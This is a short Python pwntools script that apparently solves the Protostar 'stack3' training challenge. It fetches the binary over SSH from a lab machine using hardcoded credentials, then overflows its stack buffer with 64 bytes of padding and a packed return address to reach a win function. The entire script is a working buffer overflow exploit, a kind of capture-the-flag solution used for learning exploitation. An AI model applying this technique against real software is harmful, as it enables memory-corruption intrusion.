import os, sys, subprocess
from pwn import *

context(arch='i686', os='linux')

shell = ssh(host='192.168.94.129', user='user', password='user', port=22)
shell.download_file('/opt/protostar/bin/stack3')
if not os.access('./stack3', os.X_OK):
    subprocess.call('chmod +x ./stack3', shell=True)

junk = 'A'*cyclic_find(0x61616171) # 64
win_fnc = p32(0x08048424, endian='little')

p = process('./stack3')
p.sendline(junk+win_fnc)
log.info(p.recv())
